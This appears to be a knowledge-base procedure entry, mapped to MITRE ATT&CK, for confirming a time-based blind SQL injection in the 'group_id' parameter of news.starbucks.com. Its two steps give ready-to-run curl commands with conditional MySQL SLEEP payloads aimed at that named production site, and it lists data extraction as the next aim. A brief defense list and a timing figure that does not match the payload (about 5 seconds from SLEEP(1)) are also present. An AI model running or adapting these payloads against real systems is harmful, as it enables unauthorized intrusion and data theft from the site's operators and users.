---
id: proc-uuid-002
tags:
  - blind-sqli
  - time-based
type: procedure
tools:
  - '[[tools/curl]]'
  - '[[tools/time]]'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands:
  - '[[commands/test-true-condition-sqli]]'
  - '[[commands/test-false-condition-sqli]]'
verified: false
platforms:
  - Web
  - MySQL
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:26.268Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Verify-Time-based-Blind-SQL-Injection

## Summary

This procedure verifies a time-based blind SQL injection by injecting conditional SLEEP payloads into the 'group_id' parameter and measuring response time differences between true and false conditions.

## Description

Time-based blind SQLi exploits delays in database queries (e.g., MySQL SLEEP) to infer boolean results without visible output. On news.starbucks.com, the unsanitized 'group_id' allows IF statements to trigger delays, confirming control over backend execution. This enables further attacks like data extraction via binary search.

## Requirements

1. curl and time tools available
2. Target endpoint accessible
3. Baseline timing knowledge (normal responses ~1s)

## Defense

Defensive measures and detection strategies:

- Parameterize queries to prevent injection
- Log and alert on response times exceeding thresholds
- Disable or limit SLEEP/BENCHMARK functions in DBMS

## Objectives

1. Demonstrate delay on true condition
2. Confirm no delay on false condition
3. Validate blind SQLi for escalation

## Instructions

### Step 1: Test True Condition

**Context**: Inject IF(1=1,SLEEP(1),0) to force a 1-second delay if injectable.

**Command** ([[commands/test-true-condition-sqli]]):
```bash
time curl --data "ACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(1=1,SLEEP(1),0) AND group_id='1" https://news.starbucks.com
```

> Measures total execution time; delay indicates successful injection. Expected: ~5s total due to SLEEP.

### Step 2: Test False Condition

**Context**: Use IF(1=2,SLEEP(1),0) to avoid delay, confirming timing control.

**Command** ([[commands/test-false-condition-sqli]]):
```bash
time curl --data "ACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(1=2,SLEEP(1),0) AND group_id='1" https://news.starbucks.com
```

> Faster response verifies the difference is payload-driven. Expected: ~1s.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/test-true-condition-sqli]]
- [[commands/test-false-condition-sqli]]

## Tools Used

- [[tools/curl]]
- [[tools/time]]

## Tags

- [[blind-sqli]]
- [[time-based]]
